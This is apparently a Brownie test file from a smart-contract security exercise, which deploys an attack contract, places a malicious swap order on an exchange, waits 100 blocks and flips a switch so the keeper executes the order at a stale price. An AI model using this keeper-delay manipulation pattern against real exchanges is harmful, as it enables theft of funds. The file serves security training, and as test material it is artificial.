from scripts.GAS_manipulation1 import *
from brownie import AttackContract2, reverts

def test_gas_manipulation():
    # You spot the critical vulnerability and hastily code up your attack contract
    # TODO: Implement your AttackContract and then deploy it

    attackContract = AttackContract2.deploy({'from': attacker})

    orderCreationBlockNumber = chain[-1].number + 1

    # It is currently the orderCreationBlockNumber, the price of Ether is $5,000 per ETH
    # TODO: Create a malicious order on the Exchange

    exchange.createSwapOrder(BUY_WETH_SWAP_PATH, ORDER_USDC_AMOUNT,  attackContract)

    #print("Before first revert")
    #// The keeper attempts to execute the order, but cannot
    #with reverts():
        #exchange.executeSwapOrder(1, getKeeperPriceParams(ORDER_CREATION_PRICE, orderCreationBlockNumber))

    #print("Sleeping for 100 blocks...")
    chain.mine(100)
    # Now the keeper successfully executes the order.
    # Why was this an exploit? What were you able to do?
    attackContract.flipSwitch()


    tx = exchange.executeSwapOrder(1, getKeeperPriceParams(ORDER_CREATION_PRICE, orderCreationBlockNumber))
    # Assert that an event was emitted
    assert tx.events.keys().pop() == "SwapOrderExecuted"
    assert tx.events["SwapOrderExecuted"][0]["id"] == 1, "First argument was incorrect"
    assert tx.events["SwapOrderExecuted"][0]["price"] == ORDER_CREATION_PRICE, "Second argument was incorrect"

 
